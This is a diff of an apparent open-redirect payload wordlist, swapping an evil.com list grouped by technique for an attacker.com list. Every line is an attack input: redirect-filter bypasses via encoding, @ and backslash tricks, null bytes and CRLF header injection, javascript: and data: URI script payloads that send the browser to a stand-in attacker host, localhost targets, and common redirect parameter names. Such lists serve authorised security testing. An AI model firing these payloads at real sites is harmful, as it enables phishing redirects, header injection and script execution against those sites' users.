@@ -1,55 +1,89 @@
-# WebSecure Open Redirect Payload List
-# ── Basic ──
-https://evil.com
-http://evil.com
-//evil.com
-///evil.com
-////evil.com
-/\\evil.com
-# ── Protocol ──
-https://evil.com/
-https://evil.com?
-https://evil.com#
-https://evil.com/path
-https://evil.com/%2f
-# ── Encoded ──
-https%3A%2F%2Fevil.com
-%2F%2Fevil.com
-%2F%5Cevil.com
-%5C%5Cevil.com
-%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%63%6F%6D
-# ── Double encoded ──
-%252F%252Fevil.com
-%25252F%25252Fevil.com
-# ── @ bypass ──
-https://legitimate.com@evil.com
-https://legitimate.com@evil.com/
-https://evil.com@legitimate.com
-# ── Subdomain bypass ──
-https://evil.com?legitimate.com
-https://evil.com#legitimate.com
-https://legitimate.com.evil.com
-# ── Null byte / newline ──
-https://evil.com%00
-https://evil.com%00.legitimate.com
-https://evil.com%0d%0alocation:https://evil.com
-https://evil.com%0a%0dlocation:https://evil.com
-# ── CRLF in redirect ──
-%0d%0aLocation:%20https://evil.com
-%0aLocation:%20https://evil.com
-# ── Backslash ──
-https:\\\\evil.com
-/\evil.com
-\/evil.com
-# ── Javascript ──
+//attacker.com
+//attacker.com/
+///attacker.com
+////attacker.com
+https://attacker.com
+http://attacker.com
+//attacker.com%2f@trusted.com
+//trusted.com.attacker.com
+//attacker.com\trusted.com
+/\attacker.com
+\/attacker.com
+/%09/attacker.com
+/%2f/attacker.com
+/%2f%2fattacker.com
+/%5c/attacker.com
+/%5cattacker.com
+//attacker%E3%80%82com
+//attacker.com%2f%2e%2e
+//attacker%00.com
+//attacker.com%00.trusted.com
+//attacker.com%20
+//attacker.com%09
+//attacker.com%0a
+//attacker.com%0d
+//attacker.com%23
+//attacker.com%3f
+//%01attacker.com
+//0attacker.com@trusted.com
+//trusted.com@attacker.com
+https://attacker.com%2f@trusted.com
+https://trusted.com@attacker.com
+https://attacker.com/trusted.com
+https://attacker.com\.trusted.com
+https://trusted.com.attacker.com
 javascript:alert(1)
-javascript:window.location='https://evil.com'
-# ── Data URI ──
-data:text/html,<script>window.location='https://evil.com'</script>
-# ── Whitelisted domain bypass ──
-https://evil.com/https://legitimate.com
-https://legitimate.com.evil.com/
-https://legitimate.com\.evil.com
-# ── Unicode ──
-https://evil．com
-https://ｅｖｉｌ.com
+javascript://attacker.com/%0aalert(1)
+data:text/html,<script>window.location='http://attacker.com'</script>
+//attacker.com?trusted.com
+//attacker.com#trusted.com
+////attacker.com/
+///\attacker.com
+/https://attacker.com
+/http://attacker.com
+/%68%74%74%70%3a%2f%2fattacker.com
+http:attacker.com
+https:attacker.com
+http:/attacker.com
+https:/attacker.com
+http:\/\/attacker.com
+https:\/\/attacker.com
+http://127.0.0.1
+http://localhost
+//127.0.0.1
+//localhost
+//[::1]
+//0x7f000001
+http://0177.0.0.1
+url=http://attacker.com&url=http://trusted.com
+redirect=//attacker.com
+next=//attacker.com
+return=//attacker.com
+goto=//attacker.com
+destination=//attacker.com
+r=//attacker.com
+u=//attacker.com
+target=//attacker.com
+rurl=//attacker.com
+login_url=//attacker.com
+out=//attacker.com
+view=//attacker.com
+from=//attacker.com
+ref=//attacker.com
+feed=//attacker.com
+to=//attacker.com
+link=//attacker.com
+domain=attacker.com
+callback=//attacker.com
+continue=//attacker.com
+show=//attacker.com
+window=//attacker.com
+dir=//attacker.com
+path=//attacker.com
+src=//attacker.com
+page=//attacker.com
+file=//attacker.com
+returnto=//attacker.com
+returnurl=//attacker.com
+//attacker.com/%2e%2e
+//attacker.com/..%2f
